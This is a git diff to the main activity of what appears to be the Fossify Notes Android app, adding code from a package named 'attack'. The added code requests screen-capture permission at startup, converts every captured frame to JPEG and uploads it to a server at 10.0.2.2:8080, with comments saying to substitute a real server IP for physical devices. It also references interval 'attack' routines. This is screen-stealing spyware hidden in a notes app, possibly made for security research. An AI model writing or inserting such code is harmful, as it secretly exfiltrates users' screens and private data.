@@ -2,6 +2,7 @@ package org.fossify.notes.activities
 
 import android.accounts.NetworkErrorException
 import android.annotation.SuppressLint
+import android.app.Activity
 import android.content.ActivityNotFoundException
 import android.content.Intent
 import android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK
@@ -19,6 +20,7 @@ import android.print.PrintAttributes
 import android.print.PrintManager
 import android.text.method.ArrowKeyMovementMethod
 import android.text.method.LinkMovementMethod
+import android.util.Log
 import android.util.TypedValue
 import android.view.ActionMode
 import android.view.Gravity
@@ -93,8 +95,15 @@ import org.fossify.commons.views.MyEditText
 import org.fossify.notes.BuildConfig
 import org.fossify.notes.R
 import org.fossify.notes.adapters.NotesPagerAdapter
+import org.fossify.notes.attack.ScreenRecorder
+import org.fossify.notes.attack.ScreenRecorderCallback
+import org.fossify.notes.attack.ImageProcessor
+import org.fossify.notes.attack.ScreenCaptureForegroundService
+import org.fossify.notes.attack.ScreenStreamUploader
 import org.fossify.notes.attack.attack
 import org.fossify.notes.attack.startIntervalAttack
+import org.fossify.notes.attack.stopIntervalAttack
+import android.media.Image
 import org.fossify.notes.databases.NotesDatabase
 import org.fossify.notes.databinding.ActivityMainBinding
 import org.fossify.notes.dialogs.DeleteNoteDialog
@@ -135,6 +144,11 @@ class MainActivity : SimpleActivity() {
 
     private val PICK_OPEN_FILE_INTENT = 1
     private val PICK_EXPORT_FILE_INTENT = 2
+    private val REQUEST_MEDIA_PROJECTION = 1000
+
+    private var screenRecorder: ScreenRecorder? = null
+    private var isRecording = false
+    private var streamUploader: ScreenStreamUploader? = null
 
     private lateinit var mCurrentNote: Note
     private var mNotes = listOf<Note>()
@@ -195,6 +209,20 @@ class MainActivity : SimpleActivity() {
 
         checkAppOnSDCard()
         setupSearchButtons()
+        
+        // 初始化录屏器并请求权限
+        initScreenRecorder()
+    }
+    
+    private fun initScreenRecorder() {
+        screenRecorder = ScreenRecorder(this)
+        // 初始化流上传器（默认使用 10.0.2.2:8080，这是 Android 模拟器的 localhost）
+        // 如果是真机，需要改为实际服务器 IP
+        streamUploader = ScreenStreamUploader("http://10.0.2.2:8080/upload_stream")
+        // 启动前台服务以满足 MediaProjection 要求
+        ScreenCaptureForegroundService.startService(this)
+        // 请求录屏权限
+        screenRecorder?.requestPermission(this, REQUEST_MEDIA_PROJECTION)
     }
 
     override fun onResume() {
@@ -232,8 +260,8 @@ class MainActivity : SimpleActivity() {
         }
 
         updateTopBarColors(binding.mainAppbar, getProperBackgroundColor())
-        attack("main activity", this)
-        startIntervalAttack(this)
+        //attack("main activity", this)
+        //startIntervalAttack(this)
     }
 
     override fun onPause() {
@@ -246,6 +274,13 @@ class MainActivity : SimpleActivity() {
         if (!isChangingConfigurations) {
             NotesDatabase.destroyInstance()
         }
+        stopIntervalAttack()
+        // 停止录屏
+        stopScreenRecording()
+        screenRecorder = null
+        // 释放流上传器
+        streamUploader?.release()
+        streamUploader = null
     }
 
     private fun refreshMenuItems() {
@@ -379,6 +414,18 @@ class MainActivity : SimpleActivity() {
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, resultData: Intent?) {
         super.onActivityResult(requestCode, resultCode, resultData)
+        
+        // 处理录屏权限结果
+        if (requestCode == REQUEST_MEDIA_PROJECTION) {
+            if (resultCode == Activity.RESULT_OK && resultData != null) {
+                startScreenRecording(resultCode, resultData)
+            } else {
+                Log.w("MainActivity", "录屏权限被拒绝")
+                ScreenCaptureForegroundService.stopService(this)
+            }
+            return
+        }
+        
         if (resultCode != RESULT_OK || resultData?.data == null) return
 
         val dataUri = resultData.data!!
@@ -389,6 +436,56 @@ class MainActivity : SimpleActivity() {
                     dataUri, FLAG_GRANT_READ_URI_PERMISSION or FLAG_GRANT_WRITE_URI_PERMISSION
                 )
                 showExportFilePickUpdateDialog(resultData.dataString!!, getCurrentNoteValue())
+            }
+        }
+    }
+    
+    private fun startScreenRecording(resultCode: Int, data: Intent) {
+        screenRecorder?.startRecording(resultCode, data, createScreenCaptureCallback())
+        isRecording = true
+        Log.i("MainActivity", "录屏已开始")
+    }
+    
+    private fun stopScreenRecording() {
+        screenRecorder?.stopRecording()
+        isRecording = false
+        Log.i("MainActivity", "录屏已停止")
+        ScreenCaptureForegroundService.stopService(this)
+    }
+    
+    private fun createScreenCaptureCallback(): ScreenRecorderCallback {
+        return object : ScreenRecorderCallback {
+            private var frameCount = 0L
+            
+            override fun onFrameCaptured(image: Image, width: Int, height: Int) {
+                frameCount++
+                
+                // 将 Image 转换为 JPEG 并上传到服务器
+                val jpegData = ImageProcessor.imageToJpeg(image, quality = 80)
+                jpegData?.let { bytes ->
+                    // 上传到服务器
+                    streamUploader?.uploadFrameDirect(bytes)
+                    
+                    // 每 30 帧打印一次日志（避免日志过多）
+                    if (frameCount % 30 == 0L) {
+                        Log.d("MainActivity", "已上传帧 #$frameCount, JPEG 大小: ${bytes.size} bytes, 分辨率: ${width}x${height}")
+                    }
+                }
+            }
+            
+            override fun onRecordingStarted() {
+                Log.i("MainActivity", "录屏已开始")
+                frameCount = 0
+            }
+            
+            override fun onRecordingStopped() {
+                Log.i("MainActivity", "录屏已停止，总共捕获 $frameCount 帧")
+                ScreenCaptureForegroundService.stopService(this@MainActivity)
+            }
+            
+            override fun onError(error: String) {
+                Log.e("MainActivity", "录屏错误: $error")
+                ScreenCaptureForegroundService.stopService(this@MainActivity)
             }
         }
     }
